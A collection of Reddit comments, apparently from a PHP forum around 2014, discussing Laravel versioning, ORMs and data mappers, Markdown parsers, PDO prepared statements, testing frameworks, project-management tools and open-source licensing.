Well, I'm saying it's ultimately up to you about what you want.... If no part of Laravel is exposed publicly, then I'd say no, don't bump major version. If you do expose it AND/OR the fact that you use Laravel, and touting version 4 or 5 is one of the top "marketed" features, then bump the version. For example, if I built A and A depended on B, but A only had hypothetical public functions -&gt;get(), -&gt;put(), -&gt;delete(), and B had a major version update that didn't require me to change those 3 functions (or their signatures), I wouldn't bump A's major version. If B changed something completely, like -&gt;delete() was no longer possible, or required an (again, hypothetical) $id field now that I was not able to provide internally as part of A, meaning -&gt;delete() in A now has to be -&gt;delete($id), then yes, I would do a major version. It is up to you how you ultimately want to proceed. Following SemVer, what I've just laid out is a good approach.
What browser do you know of that will actually start a transfer without prompting the user?
Never created anything closed source. Any sites or apps I've built I've handed off to the client when all was said and done so they could do what they pleased with the source code. Non client work, libraries, or plugins I've created are on Github in public repos. I might not have explicitly classified everything as GPL, but I've never closed the source on anything. 
&gt; Just like an application isn't a substitute for a website, a website isn't a substitute for an app. Amen. About a year ago I had a lady ask me to make an app for her not-yet-existent business as a concierge to the wealthy. Note that she didn't want a website - she was hell-bent on an iPhone &amp; Android app, and for less than a thousand bucks. It was a short phone call, thankfully. I still shake my head at that level of ignorance.
Really? RES tells me I've upvoted him 8x in the past, so I'm gonna go out on a limb and say that you might have come to the wrong conclusion.
&gt;Let's say you have a library whose main dependency is Laravel 4 and your library is sitting at ~1.0. If you bump up the dependency to Laravel 5 should you bump up your versioning to 2.0? So the question is: When your project (A) is a library and has a dependency to another package (B), then an application (C) which depends on your library (A) and also depends on your library's dependency (B) would break? Probably yes. 
Could someone explain the down-votes? 
In the relationships: $book-&gt;idAuthor; Why not just $book-&gt;author?
Meh. Basically a rip of Jeff Atwood's announcement post three months ago, but with a PHP spin on it. http://blog.codinghorror.com/standard-flavored-markdown/ http://blog.codinghorror.com/standard-markdown-is-now-common-markdown/
In this example, "idAuthor" is a column in the Books table. If the column were named "author", then it would be $book-&gt;author.
When a library is advertised as being a data mapping library, but it fails to meet the common convention definition of what a data mapper is, you can expect to get a certain amount of scrutiny. 
LAMP developer here. For me I think RoR will be next. Node.js has massive appeal to me, but I've heard horror stories from both [Netflix](http://techblog.netflix.com/2014/11/nodejs-in-flames.html) and [Walmart](https://www.joyent.com/developers/videos/walmart-node-js-memory-leak-part-2) and their experience with enterprise-level memory leaks. Until Node.js releases into v1, I don't think I'll be using it for my primary stack.
I also got a bit caught up on the distasteful comment, but then I thought if I were to just start learning ASP.NET, alone, would the quality of my work be something I could proudly sell to an enterprise client?
I wholeheartedly agree with this comment. My ideal project is something where I'm trying one new thing, be it nginx, angularJS/EmberJS, etc. A great place to start for trying a new server-level technology would be virtual machines, e.g. both Laravel and Drupal 8 have pre-packaged, opinionated virtual machine boxes which make a great starting place for working with new technology. Edit: I haven't used the Drupal 8 one yet, and it's not even out of beta, but I brought it up because it's something I've got my eye on for trying in the future.
[Here's a great article for why Gilt switched from Rails to Scala](http://readwrite.com/2014/05/08/gilt-eric-bowman-interview-scala-rails-jvm-reactive-platform)
This is junk. I don't know how else to say it.
Isn't he going to have the same problem no matter the platform he decides on?
Another half-assed attempt at writing by Phil. I don't understand why some people think he's this great asset to the community.
This is great! I've been looking for a framework that requires more boilerplate code!
And, just to clarify, my *default* position is in favor of FLOSS. I use Linux on my desktop and use FLOSS software as much as possible. However, there are a few exceptions, notably Sublime Text and the occasional need to launch Photoshop. I realized that I sounded like an arrogant idealist while, in actuality, I'm far more pragmatic. I would be remiss not to point out that I feel similarly towards Apple. This discussion could have just as easily been a list of the reasons I don't advocate for Swift or Objective C. Unfortunately for me, it's much harder to dismiss Apple given the growing market of their ecosystem. It's obviously much easier for me to kick MS since, for once, they're no longer the dominant player across the board.
Well, OP never responded to any of the responses in this thread, so I don't really know the situation. If it's a career move, provided his boss give him sufficient leeway and support to actually learn the platform properly, I don't really see it as a problem.
The way they are expressing the goals and methods of the project are important. It's not a matter of native speaking. They're not. It's that constantly using that term "way" seems to be getting in the way of conveying more useful information about what can and can't be done and why. I'm happy to use projects by non-native speakers without comment. It doesn't generally bother me. But this does. Because it seems to me that it's lacking information.
Netflix story is just them misusing their stack, it has nothing to do with NodeJS as a platform. For me the main problem with Node is having to deal with JS all the time. No proper OOP and quirks worse than in PHP, this doesn't make you write easily expandable code if you're used to OOP.
Can you expand on some of the points and give some more example code? such as using fosrestbundle listeners to create/validate these classes instead of using symfony forms on a rest api, using faker for mocking apis etc. How do you handle filtering/pagination?
Very true. If he has some support then 100% go ahead for it. Not the vibe I got but great point.
True. I've never used Node.js so I can't speak to the quality of using it coming from an OOP background (like myself), but I can say that EmberJS + Coffeescript have done wonders for organizing application logic on the frontend.
I write a lot of Python and js. Definitely find a way to do more with other langs, you'll learn new things and bring different paradigms to your host language. It will make you better overall. I hear .Net, specially c#, has some cool shit going on
Am I the only one who feels that the concept of an ORM and the concept of a data mapper are not compatible with one another? In order to do lazy calls like: $User-&gt;comments() You implicitly need a leaky abstraction to do it. Your domain object, the User, needs to know about infrastructure stuff in order to lazy fetch a collection of comments. This is *precisely* what Active Record is. But the point of the data mapper pattern is that your domain objects *do not depend on, or know about, or care about* infrastructure stuff at all. Given that, I don't see how defining relationships through an ORM, with lazy relationship fetching, even makes sense with respect to data mappers. 
If you're using WampServer 2 from [here](http://www.wampserver.com/en/), then it should come with the appropriate mcrypt DLL files and you can enable it right from the menu. If you're rolling your own wamp server and installing some random Windows compilation of PHP, then you may have trouble finding compatible mcrypt DLLs.
Yo /u/philsturgeon imma let you finish but [cebe/markdown](https://github.com/cebe/markdown) is one of the best php markdown parsers of all time! In all honesty though, it's quite a nice package due to the ability to easily extend it (which I did for my leanpub editor site). From a quick look at the docs/code for the one that will be moved to the League, I don't see a way to add custom directives. I'll probably cry to you about it at the bar next week, but figured I'd ask beforehand.
It's Reddit?
D7 is probably going to be the main system used for sites for the next year or two at least yet - Core hasn't even been released yet, let alone most Contrib being converted over.
Have you looked into Meteor? I've been impressed with how they've managed to clean up the javascript I'm writing.
So, I also changed the docs to suffix a 'Repo' at the end of all the table objects, hope that helps!
Why creating yet again another Markdown parser and not choosing one that already exist and fix it to make it comply with CommonMark? For example Parsedown wants to be CommonMark compatible, all it needs are pull requests to fix a few edge cases.
Very good stuff. There's one downside though: mapping views to models and vice versa. I mean the theory is all nice, but unfortunately PHP lacks a good "DTO/object mapping" library (like e.g. Dozer in Java). So we need to map manually, which is sometimes a pain. But still worth it in the end.
Can it solve [this problem](http://stackoverflow.com/questions/27209909)? Seemingly Doctrine can't.
The answer from /u/shaunc is correct, but also, this has nothing to do with cookies. Also, are you sure this is from an XML file? Bit random.
This is a much more complex question than it sounds. What you're essentially looking for is a normalised database with a categories table, joined by a category_id to the games table. That will work if you just want one category per game, but if you have multiple categories - ie, action + multiplayer - you need a completely different system. For that you'd need a separate table called a "pivot" or more accurately "association" table, which stores something like game_id, category_id. The process of joining these is non-trivial for a new developer. It's not **hard**, but it's a bit fiddly. You need to learn SQL joins, for either approach. The process of making an interface that handles, stores, and retrieves by these categories is even harder. Don't use action as a category, by the way. It's meaningless. :) 
Copyright is implicit the moment you create something covered by copyright law. So closing your source code isn't something you *do*; it's already closed by default. Opening your source, on the other hand, must be explicit, as that is how you release your rights to the code (in varying degrees, depending on your licensing details). So, I don't mean to rain on your parade or anything, but unless the contracts you have with your clients are explicitly providing for an open source license on the code you create for them, then you're writing closed source code.
Well, I won't speak for /u/philsturgeon, but Parsedown's implementation/source is pretty bad. I'd much rather rewrite it from scratch than patch it, personally (it's only 1 big file).
What exactly are you trying to achieve here? Can't say anything without knowing `$babby` and `FORMED` values.
Hey, so I made two pastes: 1. assuming that the relation between the tables storing P and A happens via p_id column on A's table and the relation between tables storing Q and A happens via q_id column on A's table. You can find that here: http://laravel.io/bin/d9mjD 2. assuming that the relation between the tables storing P and A and Q and A happens via the same two fields, which I named 'owner_type' and 'owner_id'. You can find that here : http://laravel.io/bin/OeONX Both of them end up giving you data which satisfies the interface requirements you mentioned in you SO question. See if any of them work out for you. 
True, but that was just an example, /u/sirsavant mentioned `cebe/markdown`, yet another one.
No actually he explains in the comments that those `Table` classes are not the model. They are just utility classes to define the database schema.
Then I guess I stand corrected.
I am confused, why are you doing ${$babby}? 
Are you going more the microservices route with this? Maybe that's something you can write about. I'm doing the same thing at my company but using node (as the router) and php (as the microservices). I'd be very interested in seeing the open source of this one available as we might redo it in react. However we'll most likely cross that road later on since we won't have to scale nearly as large as you plan on scaling.
shut up, Symfony 2 fans it's not secure, database can be hacked easily and it's slow too.
I assume it's because annotations != phpdoc's
It's not the parser, it's the spec that they are creating. Even if they end up borrowing 100% of an existing parsers behaviour it's still a good idea to start fresh imo.
I'm not a Symfony 2 fan, I use Laravel, and if that's an actual viable criticism (and it's not) then it could have been raised in the article. Not in this absurd and juvenile comment.
&gt; if they have such mistakes they should correct it And/or you should have the understanding of the subject matter to dismiss it instead of mindlessly sharing it. And you shouldn't be trashtalking everyone who brings up the many factual errors and omissions in it.
Actual courses are hard to come by. You'll probably learn the most by setting out to achieve specific goals and finding out what it is you don't know.
You mean that the league package will be a spec? What's the point? CommonMark does that already
Yes we are. The sorts of services we might spin up in their own clusters are: - A profile service - A location service - A media processing service - A messaging service - A DB service - Etc. Conceptually you can think of it like this: The ENTIRE services layer can be thought of as the "model" layer, with an integrated ORM (such as Doctrine). Whether or not you use an ORM to contact your data store is not the point, but the layer itself is conceptually similar. Each of those services are kind of like a Repository with no Entity (in Doctrine terminology). Your application uses those microservices as if they were data sources (like Mongo, MySQL, etc), even though they aren't *exactly* data sources. (In our architecture, the DB service can only be contacted by other services.) This means that in your controller you need to have a "driver" for each service, similar to a DB driver, that wraps the main functionality of that service (and handles translation and transportation of data over sockets). Our router is a combination of Hack and PHP, although we *also* built a Node.js proof of concept as well.
You don't have to wait until monday! The morons are here all week!
Yes, CommonMark is the spec. The League is taking an existing PHP parser written against that, by the looks. That or I'm totally confused ... 
You need to remember it's their problem and you shouldn't care about some random internet stranger's problems :) Now back to money making usinig PHP
if only everyone instantly knew everything you know?
A lot of young people on Reddit like new cool things. In the real world or large corporations where you make money, PHP is still huge and well regarded. Especially the more recent versions. I am finding a lot of places using bits of other technology alongside PHP, such as Python for interface code and of course Node is getting popular but their core systems (if they are not a Java or .Net shop) tend to still be PHP. 
Let's not forget there are at least two ([1](http://www.typescriptlang.org/), [2](http://coffeescript.org/)) languages that exist purely because javascript is so horrible. 
Event driven PHP. http://reactphp.org. 
I'm trying out Web2project now and going to test collabtive (Free, but you need to pay for plugins).
This bloody joke gets posted every thread, fine we get it.
I'd suggest [PHPAcademy's](https://www.youtube.com/user/phpacademy) videos on YouTube. For general and in-dept understanding on programming (Not neccessarily specific to PHP), check out Stanford and MIT OpenCourseWare's channel on YouTube too.
You can validate any class, whether you do it in a listener or directly in the controller doesn't matter much, see here http://symfony.com/doc/current/book/validation.html 
NoSQL Databases like MongoDB in replacement of MySQL / PgSQL
What I'm working on (on and off) that's pretty simple but covers most of things is a website photo album. Seems simple enough, no? But then what if you want to be able to upload pictures from your phone as well as your laptop? Okay, so you chuck in some bootstrap responsive design. Then you want to be able to take the picture directly into the browser. Who wants to take the picture, then go to the page to upload it from their gallery? Okay, so we have the input accept camera. But now that we're skipping the album, we should be able to preview the picture, then accept it or reject it, right? So let's do it all in JS. We'll replace the upload input on phones with a camera icon, have it call the &lt;input&gt;, then detect when a file is attached, display it, and if accepted we'll upload the form. Not too hard, right? Okay, but what about taking pictures when we're offline? Or what if we want to upload pictures only on Wi-Fi? (Never figured the Wi-Fi part out. Not sure there's a solution) So now we need to pass it through JS end to end. We need to maybe have store the photos on the phone until we get internet again, then upload them into a que. Or upload them directly if we're connected. While we're at it, we should also make it an offline app, obviously. It should sync up the library part when online to get new photos from other sources. And for the backend, may as well use Symfony and Doctrine. Why not. In short: It started as a wedding album site, then adapted for taking pictures on honeymoon in Europe, not knowing how reliable our internet connection was. It worked pretty well actually. I think the only parts I didn't finish was syncing in new files uploaded on other sources and detecting wifi vs. 3G. Then again, I don't remember finding a solution at all for the last one. Maybe this weekend I'll clean up the code and link it here
&gt;Lowers cholesterol Quite the contrary, I'd say.
&gt; As I understand it, they went with the MIT license, not the GPL. This means that there is a chance that MS could decide to make it proprietary in the future and they don't have to open up any new parts they add later. &gt; Isn't that true for GPL too anyway? The author could decide to change the license for future changes that they wouldn't have to release as open-source.
Oh is it time for this thread again?
I like MantisBT. It's fucking ugly but it seems to do the job I need it to.
Yes, that is what is happening.
I currently make my living working in a LAMP stack. More recently re-building the search at the company I work at utilizing elastic search. Every time I google E.S. it's always some article about java or python or rails, but nobody seems to talk about it w/ php in mind. I noticed it uses json and php works with json like no ones business. I just get sad. I occasionally need a kick in the head to let me know I'm not off kilter with the pulse of the general web dev community.
It is just that some people can see php for what it really is, where it came from and what it can possibly be in the future. And I do hate the fact that it's apparent ease of getting started/hosted is put above every other consideration in choosing it for a project. Oh, and I also think that it is being developed by amateurs.
Used Mantis before. It's pretty useful. One of the reasons I chose web2project is due to the mantis integration it offers. I think I will just install Python and use LibrePlan. Even though it doesn't have plugins, it will have to do. Does nice pretty graphs and that.
Is there a nicer way to use mysql and prepared statements than having to bind the result and parameter variables? It feels like I'm doing something wrong, but I can't work out what I should be doing right.
why do you want it to run in PHP ? you can extend most Project Management software with API/Iframe Containers etc Maybe check this thread from four days ago: http://www.reddit.com/r/PHP/comments/2nfy01/project_planning/ 
We live in a day and age where developers have stylish beards and glasses with no lenses, and if you're not using the latest gitbash repo mvc streamlined framework you're not cool. 
satire my good sir.
By the same guy no less. It wasn't funny before and it doesn't get funnier upon repetition. 
[**@atoum_org**](https://twitter.com/atoum_org): &gt;[2014-12-01 09:30:23 UTC](https://twitter.com/atoum_org/status/539350787454160896) &gt;1.0.0 is released \\o/! &gt; &gt;\+ 2 release managers \([@mikaelrandy](https://twitter.com/mikaelrandy) &amp;amp; Ivan Enderlin from [@hoaproject](https://twitter.com/hoaproject)\) &gt; &gt;[*jubianchi.fr*](http://jubianchi.fr/atoum-release.htm) &gt; &gt;[*mnt.io*](http://mnt.io/P/2014-11-28_atoum_has_two_release_managers.html) ---- [^[Mistake?]](http://www.reddit.com/message/compose/?to=TweetPoster&amp;subject=Error%20Report&amp;message=http://reddit.com/2nxep6%0A%0APlease leave above link unaltered.) [^[Suggestion]](http://www.reddit.com/message/compose/?to=TweetPoster&amp;subject=Suggestion) [^[FAQ]](http://np.reddit.com/r/TweetPoster/comments/13relk/) [^[Code]](https://github.com/buttscicles/TweetPoster) [^[Issues]](https://github.com/buttscicles/TweetPoster/issues) 
Agree, the transformation from model into entity is a bit of a pain, but you can create a separate service for that. I'm going to look into that problem, because it's a nice issue to solve!
I thought the article advocates using *View classes in your twig templates too, and that's what I was reflecting on.
Has performance been improved?
Just a quick skim, but aren't you wasting quite a bit of cycles by running thousands of iterations of PBKDF2? Just one iteration would do ;)
&gt; but you can create a separate service for that yeah that's exactly the problem ;) we have to write it everytime. If you get cracking at a PHP lib for mapping objects to other objects (or other kind of data), I might be motivated to help out, let me know.
Absomolutely. If you're using PDO you can. If you're using mysqli, then... stop using mysqli and start using PDO. It's better in every way. A lot of people don't realise that `execute()` will take an argument. That argument can be an array of the values to bind. For example, the following is entirely valid. $data = [ 'id' =&gt; 3, 'first_name' =&gt; 'Susan', 'last_name' =&gt;'Jackson', 'email' =&gt; 's.jackson@example.com' ]; $stmt = $dbh-&gt;prepare("UPDATE USERS SET first_name = :first_name, last_name = :last_name, email = :email WHERE user_id = :id"); $stmt-&gt;execute($data); There are a few "gotchas" with this technique, though. First of all, it's worth pointing out that though the `bind()`method requires you to specifically put the :, this does not. Secondly, the array unfortunately **does** have to be "correct". Any extra keys not associated with a token will cause it to poop itself. Ditto any missing keys. This means if using it with some sort of generated array, whether data from a DB or from $_POST or something, you may need to clean or format the array. $data =$_POST; unset($data['_method'], $data['submit_type']); This still has flaws (people could literally add fields you haven't unset, for example) but as a general idea it is workable. Things like Laravel provide nice utility functions for stuff like this. $data = array_only(Input::all(), ['id', 'first_name', 'last_name', 'email']); Similar functionality could be implemented with other libraries, though I don't know them off hand.
Why not use carbon? In fact really, just look on packagist and add libraries to your composer file - reimplementing basic functionality is not the best use of time!
Personally for any datetime range stuff I'd use http://period.thephpleague.com/api/
Ignoring for a second that you're cluttering global with methods... Methods like this seem like a good idea until you get a nice nest of them you have to maintain, and you realise you didn't take into account all of the options, or you want to change a formatting or... just about anything. [DateTime::diff is already built into PHP](http://php.net/manual/en/datetime.diff.php) and you're much better off using that. You should find that PHP's got built in functions to cover a huge range of stuff, and for random things you're better off pulling in some sort of library.
Ah, I see your point then. Well, you can use it for your Twig template, but I don't really see a point in doing it, since your entity won't really "leave" your application. When talking about this in the context of a Twig template, I wholeheartedly agree with you!
I think it would be really useful for cases like this!
I use a framework for pretty much anything. I have found that these sorts of utility function are a bit of an anti-pattern.
Any framework in particular? I tend to steer away from any *CMS* system or *framework* purely for the reason none of them do what I need them to. I build my applications in a way that no framework can help me with. Unless there is a framework out there purely for building *API systems* ;) - if so send me that way! I use PHP purely for creating and formatting the data required, as fast as possible, then outputting this data as JSON. What is the point in me using something as big as Laravel or CakePHP when they are concentrated on mainly MVC architecture and routing. All I need is a few classes, and a few files and my PHP is done in less disk space than your average jpg image. 
Reading the README on Github, I admit I'm failing at seeing how or why this is supposed to be simpler to use than PHPUnit. Any pointers?
My bad, sorry
@ozh There are many things different (and I think more powerful and simple to use) with PHPUnit. For example, the typical configuration for atoum looks like: ```php &lt;?php $runner-&gt;addTestsFromDirectory(__DIR__ . '/tests/units'); ``` And you are good to go. You can also have a sneak peak of available features here: https://github.com/atoum/atoum#why-atoum
I think you mean "sneak peek".
JavaScipt is fine. It's just retarded hipsters that feel the need to write CoffeeScript. As for TypeScript, I still don't understand why I'd use that...
We have other software that uses PHP. We could install another service, but then we must use a different connecting port for that software.
I'm mostly just chatting at this point, so don't take this as some sort of demand that you buckle up fly right. :) I think you've got some misapprehensions about frameworks. Something like Laravel is intended to make development faster and easier. Diskspace is pretty much irrelevant, and the dependencies of a framework are self-managing. You're right that a simple json api doesn't require something like Laravel. At first. How many resources? Are they nested? How much complexity will be built in over time? One of the things that makes something like Laravel useful is that it scales well. You don't get something that starts neat and elegant and over time gets nastier. Laravel is very good for making JSON APIs, actually. Its native resources echo out to pure JSON. It also has "resource controllers" which are prebuilt restfully, a simple generator can make stubs. [A more advanced generator](https://github.com/JeffreyWay/Laravel-4-Generators) can build the entire restful resource, model, database migration. You can literally have a simple working restful resource working within a minute, not counting install time of Laravel. &gt; concentrated on mainly MVC architecture and routing Don't dismiss the benefits of MVC just because your V ain't big. The point of the architecture isn't to manage HTML, it's to put things into discrete layers of responsibility. There are benefits to this. And if your app is simple and you don't want to deal with much, check this out for a routes file: // routes.php Route::get('puppy', function(){ return Puppy::all(); }); Route::get('puppy/{id}', function($id){ return Puppy::find($id); }); You'd need a two line model file as well, but it will absolutely work at this point, and I suspect much **less** code than anything custom. I should point out that I'm not advocating the above. It's not exactly best-practise. But if you're looking for light weight... there you go.
It comes down to a more nifty assertion syntax. Apart from that it's still just cabalized unit testing. It's making little from the process separation per xdebug, no introspection, didn't take the cue from `nose`, still requires mocking and test boilerplate. While it looks actually well-engineered, it seems to have regressed from the initial design ideas halfway in - back to xUnit surface probing as intended for compiled languages.
Really dumb question. I know little about php but I do know the basic syntax, etc. I'm trying to manipulate a MediaWiki install (php) to add a special div with some buttons on the sidebar (I could just add elements to the DOM using JS, but that feels like a clunky way to go about things). Based on the research I've done so far, I think I might be able to make this happen using a special "skin" or by altering the base template [here](https://doc.wikimedia.org/mediawiki-core/master/php/html/BaseTemplate_8php_source.html#l00001) or by writing a new class that maybe extends the BaseTemplate and does what I want it to do. Am I thinking about this in the right way? It seems like it should be a trivial thing to just add a div, but it's frustrating me a bit, likely because I don't know what I'm doing.
Yeah, I don't like these either. IMO they should be part of some sort of object. But still. 
Mocking is more simple than any other unit testing framework for PHP: Just do `new \mock\this\class` and you have a mock instance, and you can manage it very easily. For example, do `$this-&gt;calling($mock)-&gt;aMethod = uniqid()` and the method will return a random string, use `$this-&gt;calling($mock)-&gt;throw = new \exception` and the method will throw an exception, and if you want fine control, do `$this-&gt;calling($mock)-&gt;aMethod = function() { // do what you want here }`. Moreover, atoum support test method isolation in a separate PHP process out-of-the box, and use parallelization to speed up test execution.
&gt; than having to bind the result and parameter variables? This sounds like someone tried to do you a "favour" by advising `mysqli` over `PDO`. Common mistake. Just because mysql**i** looks similar on the outset, doesn't mean it's simpler to transition to from the dated mysql_ functions. Using it properly w/ parameter binding is just more work than with PDO. (Complexity seldomly abets security). Switch while you still can. Nobody has any business using `mysqli`. It's yet another stop-gap API. Hardly anyone uses it for new projects. As for simplification, use any *decent* PDO wrapper class (but eschew the hogwash connection handlers and NIH method redeclaration ones). It can be made as simple as: $r = db("SELECT title FROM tbl WHERE val IN (??)", $data); print $r-&gt;title; Even if it doesn't add anything fancy like array binding, the simplest wrapper signature to separate query from params, and abstract results sets (mixed ArrayInterface and Iterator) will help. As long as it allows to mix in / alternate with plain PDO calls (barely lengthier), it's all good.
YouTrack is free for up to 10 users: https://www.jetbrains.com/youtrack/ Also, the entire Atlassian suite is like 50 bucks if you're a small company. 
They could, but anything GPL would *always* remain GPL. If I understand correctly, they would basically need to fork their code and remove all GPL items in order to change to a different license. Granted, I'm not a GPL expert, so I could be wrong.
If you like Trello, you will find [Kanboard](http://kanboard.net/) extremely attractive. Redmine is great for complex teams, but you will need to lay out the structure before installing it, carefully read all the documentation and decide if you want the newest version or the one in repositories. Check the plugin list to see what version to use.
Something like silex and slim both are incredibly good at API Systems. Also, its almost 2015, why is this an issue. &gt; less disk space than your average jpg image. &gt; What is the point in me using something as big as Laravel or CakePHP when they are concentrated on mainly MVC architecture and routing They can also be stripped down to just do what you need. Same with Zend, or Symfony.
&gt;I tend to like building things custom because that way I have more control over every action happening. You still have plenty of control of what you are doing, while using a micro framework like slim or silex. And arguably, plenty of control when using frameworks like Symfony and Zend. Though your point tends to be true for some frameworks like Yii, Laravel, and Cake. &gt; Also there are hackers who are always looking at ways to break a new framework, or find a vulnerability in a frameworks code. By building custom, I lower this risk. I'm sorry, but this is quite simply not true. There are more developers trying to **FIX** security issues in major frameworks, than yours, and more developers using major frameworks to find the bugs than yours. &gt; I know alot of frameworks now include this sort of thing, but if you didn't build it can you honestly say you understand it? If you want to expand / improve it a little, could you? Thats not really the point. You are spending time writing this stuff when someone else, who has quite possibly has a better understanding, has already written solid code to do this. FOR EXAMPLE, the code you've posted above has already been written by libraries like Carbon and Period. They are both well tested libraries, getting lots of code input from plenty of smart people. I'd trust that code far before i'd trust yours, or my own. (not that i don't trust my own code, just proving a point.) --- Every argument you've made seriously makes me cringe. 
Testing.
Starting looking at Angular recently, then came across Firebase (and the AngularFire binding). Pretty impressive how quickly you can start writing apps with no backend.
Popularity does not necessarily equal a vibrant, active and helpful community. Also, I would call the Laravel community "fanatics" before the symfony community. And I don't mean this as an insult. The Laravel community is a LOT more passionate about their framework.
Not really a replacement, since NoSQL and RDBMS have different features http://www.thegeekstuff.com/2014/01/sql-vs-nosql-db/
The instant mock doubles are more convenient than other implementations, of course. Your monkey overridding of core funcs moreso IMO. Best part of atoum may turn out to be your extensive manual however. (As Phar packaging tip: use a `#!/usr/bin/php -dphar.readonly=0` shebang right away.) The CGI/PHP model (process cleanup) is the only approach that makes sense of course / much saner than tedious manual tearDowns. Still not sure why xdebug isn't utilized beyond coverage scoring then.
I don't know about the setup to be frank, but what I like in atoum is: * the assertions mechanism, extensible and a big collections build-in, for example `-&gt;float(1 - 0.97)-&gt;isNearlyEqualTo(0.03)`, * because of the assertions mechanism, several ways to write tests, either with the “academic style” (given/when/then), with the “BDD style” (should…) or “atoum style” etc. * mock system for classes (simply prefix your classname by `\Mock`) or functions (`-&gt;function-&gt;time = 42`), * the extension API, helps to plug any new assertions or any code inside your test API (take a look at the [Features to port! Section](http://mnt.io/P/2014-11-28_atoum_has_two_release_managers.html) of this article).
According to [this](http://php.net/manual/en/features.gc.collecting-cycles.php), turning off GC may cause memory leaks because some roots may not fit in the root buffer. I opine that GC is never the main cause of poor application performance. And that it is enabled, by default, for a reason. And that this "optimisation" is an anti-pattern.
I don't get it. Why isn't speed a reason to use ===? In case you know that your variables are of the same type (like in the example above), why should someone choose a method, which can be up to 40% slower, if he can get the same result - but faster - by typing one more '='? 
You have not understood the problem and, I suspect, cannot read class diagrams. `P` stores `Foo`s and `Q` stores `Bar`s. `Foo` and `Bar` may have any number of concrete implementations which means retrieving `P`'s collection of `Foo`s will often yield a mixed collection of concrete classes. Delivering only one concrete type per collection does not satisfy the requirements.
Not invalidate per se, but the nature of a [Permissive Free License](https://en.wikipedia.org/wiki/Permissive_free_software_licence) means that there is "no guarantee that future generations of the software will remain free." And, IIRC, that "free" means "free as in speech" not necessarily "free as in beer." Now, I should point out that there are a lot of great projects that use the MIT license. Node.js, jQuery and Ruby on Rails apparently all use it. So, IMO, there's not anything wrong or cause for concern with the MIT license from a FLOSS standpoint. *But*, as I rambled on about elsewhere, Microsoft's history with FLOSS has been less than friendly. So, in that case, their choice to go with the MIT license makes me suspicious. I don't really have the same concerns when it comes to the 37Signals team or John Resig. I don't see either of them deciding to suddenly close the source on their products and/or start requiring a licensing fee, but I can't say I feel the same about Microsoft.
#####&amp;#009; ######&amp;#009; ####&amp;#009; [**Permissive free software licence**](https://en.wikipedia.org/wiki/Permissive%20free%20software%20licence): [](#sfw) --- &gt;A __permissive free software licence__ is a class of [free software licence](https://en.wikipedia.org/wiki/Free_software_licence) with minimal requirements about how the software can be redistributed. Such licenses therefore make no guarantee that future generations of the software will remain free. This is in contrast to licences which have reciprocity / share-alike requirements. Both sets of free software licences offer the same freedoms in terms of how the software can be used, studied, and privately modified. A major difference is that when the software is being redistributed (either modified or unmodified), permissive licences permit the redistributor to restrict access to the modified source code, while copyleft licenses to do not allow this restriction. The term "permissive" as applied to software licensing is sometimes debatable in terms of specific terms and requirements, with occasional references to very weak copyleft being described as "permissive". A more narrowly constrained term related to permissive licensing is [copyfree](https://en.wikipedia.org/wiki/Copyfree), which implies distinct licence term requirements analogous to, but different from, those of [free software](https://en.wikipedia.org/wiki/Free_software). &gt; --- ^Interesting: [^Libpng](https://en.wikipedia.org/wiki/Libpng) ^| [^Boehm ^garbage ^collector](https://en.wikipedia.org/wiki/Boehm_garbage_collector) ^| [^Permissive](https://en.wikipedia.org/wiki/Permissive) ^| [^WaveSurfer](https://en.wikipedia.org/wiki/WaveSurfer) ^Parent ^commenter ^can [^toggle ^NSFW](/message/compose?to=autowikibot&amp;subject=AutoWikibot NSFW toggle&amp;message=%2Btoggle-nsfw+cmhv7kb) ^or[](#or) [^delete](/message/compose?to=autowikibot&amp;subject=AutoWikibot Deletion&amp;message=%2Bdelete+cmhv7kb)^. ^Will ^also ^delete ^on ^comment ^score ^of ^-1 ^or ^less. ^| [^(FAQs)](http://www.np.reddit.com/r/autowikibot/wiki/index) ^| [^Mods](http://www.np.reddit.com/r/autowikibot/comments/1x013o/for_moderators_switches_commands_and_css/) ^| [^Magic ^Words](http://www.np.reddit.com/r/autowikibot/comments/1ux484/ask_wikibot/)
If for the exact same software that they assigned an MIT license, they later decide that it's not "free" as in "free speech" anymore, that would practically mean they invalidate the MIT license. Or if by future generations you mean newer versions of the code, then what I commented previously applies, namely that the same is possible with GPL software, because the owner of the code could decide to release future code under a different license (even proprietary). Although if we look at trends, people who tend to release software under GPL tend to keep the software open source; most MIT released software are also usually kept MIT; although I can definitely agree on the fact that generally Microsoft's "style" is not open source.
Think about an industry you want to work in and see what it takes to get bits and pieces done there. I.e.: if you're wanting to work a card processing company, take into account you'll have to work with different APIs if you're not doing the processing yourself (i.e.: I deal w/ SOAP and REST). If you're looking to get into a mobile app start up, learn some simple Java or an open source app you can study from, and learn how to sync data between a server and the app.
&gt; Although if we look at trends, people who tend to release software under GPL tend to keep the software open source; most MIT released software are also usually kept MIT; although I can definitely agree on the fact that generally Microsoft's "style" is not open source. Absolutely true. I was remiss in not making my anti-MS bias clear initially. At this point, I have very little reason to trust them, and would probably feel the same even if they made Windows completely GPL tomorrow. 
&gt;it seems like a one man show with Taylon Otwill as it's mastermind. Good thing he didn't compare google searches of the projects' top contributors.
Interesting tip. It is probably worth mentioning the pecl [Weakref](http://pecl.php.net/package/Weakref) package also. 
Here's some language-agnostic stuff: * BDD * unit testing * DDD * CQRS, Event Sourcing
That one is good, but you have to be really careful with references you assign as weak. It's super easy to get exceptions in runtime due to making a mistake with that
Slightly off-topic, but can someone explain this to me : $view = new static;
Cross-post from r/cars: * BMW has almost twice as many Google searches as Mercedes, with Audi somehwere in the middle, so BMW are the most popular and the "cool kid on the block". * Google has 2.3 million results for "mercedes garage london", which is twice as many as Audi &amp; BMW, so the Mercedes community are the best at problem solving. * Pistonheads shows there are more Mercedes cars for sale than Audi and BMW, so people want to migrate away from Mercedes to other car makes.
But yet, the BMW is in the shop every other week (Based on what I've seen with several peoples experiences of the last couple years).
most project management software is not "installed" but runs as an external service, if you dont want to modify stuff then theres no reason to "install" it
Hi /r/php - I wrote a book on deploying PHP applications last year. I haven't had time to maintain it or market it, and I'd rather someone get some value from it rather than it sit as a PDF on my computer. Email me if you would like a PDF version or if you like (or don't like) it.
Didn't know you could use the keyword that way. Thanks for the tip !
Correct. Parsedown is focusing on speed first, CommonMark-PHP will focus on code quality and spec compliance. Different tools for different goals. 
